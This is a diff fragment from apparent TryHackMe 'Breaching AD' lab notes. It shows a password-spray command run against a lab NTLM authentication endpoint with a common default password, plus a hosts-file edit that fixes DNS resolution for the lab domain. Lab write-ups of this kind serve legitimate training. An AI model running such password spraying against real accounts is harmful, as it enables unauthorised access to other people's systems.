@@ -1398,7 +1398,7 @@ cd /root/Rooms/BreachingAD/task3/
 python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
 ````
 
-## at first it not work when i 
+## at first it not work because DNS Resolution so i try
 
 ```
 echo "10.200.70.201 ntlmauth.za.tryhackme.com" >> /etc/hosts
